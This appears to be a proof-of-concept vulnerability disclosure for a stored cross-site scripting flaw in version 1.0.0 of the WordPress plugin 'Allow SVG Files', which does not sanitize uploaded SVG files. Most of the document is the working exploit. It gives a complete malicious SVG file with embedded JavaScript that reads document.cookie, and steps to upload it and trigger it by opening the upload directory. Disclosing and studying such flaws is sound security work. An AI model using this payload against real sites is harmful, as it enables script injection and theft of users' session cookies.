# Cross Site Scripting Though SVG Files in "Allow SVG Files" Wordpress Plugin

This PoC describe how to exploit a Cross-Site Scripting (XSS) in - Wordpress "Allow SVG Files" version 1.0.0

# Description

The "Allow SVG Files" v1.0.0, plugin for Wordpress does not sanitize the SVG Files, so it is possible to upload a malicious SVG File to get a XSS.

![1](https://user-images.githubusercontent.com/70114276/166060325-e8294eac-d0b8-452d-b682-f02ded4f7e5b.png)

## Attack Scenario

First we create our SVG file with this content:

![3](https://user-images.githubusercontent.com/70114276/165981536-9ee8b054-0275-4268-83c1-160039432cb2.png)

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400" />
<script type="text/javascript">
alert(document.cookie);
</script>
</svg>
```

Then we upload the file to WordPress

![image](https://user-images.githubusercontent.com/70114276/166068854-1b37bcd9-cd82-42c1-9f40-7d9001817ef5.png)


To validate the PoC, simply access the directory where the file was sent.

![XSS](https://user-images.githubusercontent.com/70114276/166069072-81c9d17f-7f52-428d-9032-98e0f147008a.png)
